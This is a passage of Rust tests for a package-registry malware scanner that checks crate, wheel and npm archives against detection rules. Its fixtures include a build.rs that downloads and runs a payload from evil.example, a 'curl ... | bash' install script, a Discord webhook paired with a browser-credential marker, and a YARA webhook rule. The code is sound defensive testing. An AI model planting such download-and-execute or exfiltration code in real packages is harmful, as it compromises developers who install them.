        let mut capture = sample_capture(Ecosystem::Pypi, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0-py3-none-any.whl".to_string(),
            kind: Some("bdist_wheel".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "pypi_exfil_channel_with_theft_markers" })
        );
    }

    #[tokio::test]
    async fn detects_crate_build_script_downloader_rule() {
        let temp = tempdir().unwrap();
        let archive = write_crate_archive(
            temp.path(),
            "demo-1.0.0.crate",
            &[
                (
                    "demo-1.0.0/Cargo.toml",
                    "[package]\nname = \"demo\"\nversion = \"1.0.0\"\n\n[build-dependencies]\ncc = \"1\"\n",
                ),
                (
                    "demo-1.0.0/build.rs",
                    "fn main() { std::process::Command::new(\"curl\").arg(\"https://evil.example/payload\").arg(\"-o\").arg(\"/tmp/payload\").status().unwrap(); std::process::Command::new(\"sh\").arg(\"-c\").arg(\"chmod +x /tmp/payload && /tmp/payload\").status().unwrap(); }",
                ),
                (
                    "demo-1.0.0/src/main.rs",
                    "fn main() { println!(\"demo\"); }",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::CratesIo, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0.crate".to_string(),
            kind: Some("crate".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "crate_build_script_downloader")
        );
    }

    #[tokio::test]
    async fn detects_crate_exfil_channel_with_theft_markers_rule() {
        let temp = tempdir().unwrap();
        let archive = write_crate_archive(
            temp.path(),
            "demo-1.0.0.crate",
            &[
                (
                    "demo-1.0.0/Cargo.toml",
                    "[package]\nname = \"demo\"\nversion = \"1.0.0\"\n",
                ),
                (
                    "demo-1.0.0/src/main.rs",
                    "fn main() { let hook = \"https://discord.com/api/webhooks/123/abc\"; let marker = \"Local State\"; println!(\"{} {}\", hook, marker); }",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::CratesIo, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0.crate".to_string(),
            kind: Some("crate".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "crate_exfil_channel_with_theft_markers" })
        );
    }

    #[tokio::test]
    async fn crate_scan_does_not_match_npm_installer_rule_from_embedded_package_json() {
        let temp = tempdir().unwrap();
        let archive = write_crate_archive(
            temp.path(),
            "demo-1.0.0.crate",
            &[
                (
                    "demo-1.0.0/Cargo.toml",
                    "[package]\nname = \"demo\"\nversion = \"1.0.0\"\n",
                ),
                (
                    "demo-1.0.0/package.json",
                    r#"{
                        "name":"demo",
                        "version":"0.2.0",
                        "scripts":{"install-skill":"node -e \"require('child_process').execSync('bash scripts/install.sh')\""},
                        "bin":{"demo-skill":"./scripts/install.sh"}
                    }"#,
                ),
                (
                    "demo-1.0.0/scripts/install.sh",
                    "curl https://evil.example/payload.sh | bash",
                ),
                (
                    "demo-1.0.0/src/main.rs",
                    "fn main() { println!(\"demo\"); }",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::CratesIo, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0.crate".to_string(),
            kind: Some("crate".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "npm_downloader_and_exec_installer" })
        );
    }

    #[tokio::test]
    async fn ignores_benign_crate_build_script() {
        let temp = tempdir().unwrap();
        let archive = write_crate_archive(
            temp.path(),
            "demo-1.0.0.crate",
            &[
                (
                    "demo-1.0.0/Cargo.toml",
                    "[package]\nname = \"demo\"\nversion = \"1.0.0\"\n",
                ),
                (
                    "demo-1.0.0/build.rs",
                    "fn main() { println!(\"cargo:rerun-if-changed=build.rs\"); }",
                ),
                (
                    "demo-1.0.0/src/main.rs",
                    "fn main() { println!(\"demo\"); }",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::CratesIo, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0.crate".to_string(),
            kind: Some("crate".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| matched.rule_id == "crate_build_script_downloader")
        );
    }

    #[tokio::test]
    async fn ignores_crate_webhook_notifier_without_theft_markers() {
        let temp = tempdir().unwrap();
        let archive = write_crate_archive(
            temp.path(),
            "demo-1.0.0.crate",
            &[
                (
                    "demo-1.0.0/Cargo.toml",
                    "[package]\nname = \"demo\"\nversion = \"1.0.0\"\n",
                ),
                (
                    "demo-1.0.0/src/main.rs",
                    "fn main() { let hook = \"https://discord.com/api/webhooks/123/abc\"; println!(\"{}\", hook); }",
                ),
            ],
        );

        let mut capture = sample_capture(Ecosystem::CratesIo, "demo");
        capture.artifacts = vec![crate::capture::CapturedArtifact {
            url: None,
            filename: "demo-1.0.0.crate".to_string(),
            kind: Some("crate".to_string()),
            size_bytes: None,
            uploaded_at: None,
            yanked: None,
            hashes: Default::default(),
            provenance_path: None,
        }];
        capture.details["local_artifact"] = json!({ "path": archive });
        let signal = scan_captured_release_inner(&reqwest::Client::new(), temp.path(), &capture)
            .await
            .unwrap();

        assert!(
            !signal
                .matches
                .iter()
                .any(|matched| { matched.rule_id == "crate_exfil_channel_with_theft_markers" })
        );
    }

    #[test]
    fn run_yara_scan_preserves_pattern_match_evidence() {
        let rules = compile_rule_sources(&[(
            PathBuf::from("inline.yar"),
            r#"
rule inline_pattern_evidence
{
    strings:
        $hook = "discord.com/api/webhooks/"
    condition:
        $hook
}
"#
            .to_string(),
        )])
        .unwrap();

        let package_context = PackageScanContext {
            ecosystem: Ecosystem::Npm,
            package_name: "demo".to_string(),
            package_version: "1.0.0".to_string(),
            has_install_script: false,
            has_build_script: false,
            has_bin: false,
            has_repository: true,
            windows_target: false,
            dependency_count: 0,
            dependency_flags: DependencyFlags::default(),
        };
        let scan_targets = vec![ScanTarget {
            path: "index.js".to_string(),
            role: FileRole::Entrypoint,
            bytes: b"const hook='https://discord.com/api/webhooks/123/abc';".to_vec(),
            text: true,
            size_bytes: 55,
        }];

        let matches = run_yara_scan(&rules, &package_context, &scan_targets).unwrap();
        let matched = matches
            .iter()
            .find(|matched| matched.rule_id == "inline_pattern_evidence")
            .unwrap();

        assert_eq!(matched.evidence_kind.as_deref(), Some("pattern"));
        assert_eq!(matched.matched_patterns, vec!["$hook".to_string()]);
        assert_eq!(matched.pattern_matches.len(), 1);
        assert_eq!(matched.pattern_matches[0].pattern_id, "$hook");
        assert!(
            matched.pattern_matches[0]
                .preview
                .as_deref()
                .is_some_and(|preview| preview.contains("discord.com/api/webhooks/"))
        );
    }

    fn write_npm_archive(base: &Path, files: &[(&str, &str)]) -> String {
        let source_root = base.join("archive-source");
        let package_root = source_root.join("package");
        fs::create_dir_all(&package_root).unwrap();

        for (relative_path, content) in files {
            let path = package_root.join(relative_path);
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(path, content).unwrap();
        }

        let archive_path = base.join("package.tgz");
        let status = ProcessCommand::new("tar")
            .arg("-czf")
            .arg(&archive_path)
            .arg("-C")
            .arg(&source_root)
            .arg("package")
            .status()
            .unwrap();
        assert!(status.success());
        archive_path.to_string_lossy().to_string()
    }

    fn write_pypi_wheel(base: &Path, filename: &str, files: &[(&str, &str)]) -> String {
        let archive_path = base.join(filename);
        let file = fs::File::create(&archive_path).unwrap();
        let mut writer = zip::ZipWriter::new(file);
        let options: FileOptions<'_, ()> =
            FileOptions::default().compression_method(CompressionMethod::Deflated);

        for (relative_path, content) in files {
            writer.start_file(*relative_path, options).unwrap();
            std::io::Write::write_all(&mut writer, content.as_bytes()).unwrap();
        }

        writer.finish().unwrap();
        archive_path.to_string_lossy().to_string()
    }

    fn write_pypi_sdist(base: &Path, filename: &str, files: &[(&str, &str)]) -> String {
        let archive_path = base.join(filename);
        let archive_file = fs::File::create(&archive_path).unwrap();
        let encoder = GzEncoder::new(archive_file, Compression::default());
        let mut builder = Builder::new(encoder);

        for (relative_path, content) in files {
            let bytes = content.as_bytes();
            let mut header = Header::new_gnu();
            header.set_entry_type(tar::EntryType::Regular);
            header.set_mode(0o644);
            header.set_size(bytes.len() as u64);
            header.set_cksum();
            builder
                .append_data(&mut header, *relative_path, std::io::Cursor::new(bytes))
                .unwrap();
        }

        builder.finish().unwrap();
        archive_path.to_string_lossy().to_string()
    }

    fn write_crate_archive(base: &Path, filename: &str, files: &[(&str, &str)]) -> String {
        write_pypi_sdist(base, filename, files)
    }

    fn sample_capture(ecosystem: Ecosystem, package: &str) -> CapturedRelease {
        CapturedRelease {
            event_id: format!("{}:{package}@1.0.0", ecosystem.as_str()),
            ecosystem,
            package: package.to_string(),
            version: "1.0.0".to_string(),
            observed_at: Utc::now(),
            published_at: None,
            captured_at: Utc::now(),
            status: ReleaseStatus::Active,
            package_url: None,
            release_url: None,
            metadata_url: None,
            raw_metadata_path: None,
            artifacts: Vec::new(),
            upstream_repository: None,
            details: json!({
                "dependencies": [],
                "bin": null,
                "main": null,
                "pkg_targets": [],
                "has_install_scripts": false,
                "local_artifact": null
            }),
        }
    }
}
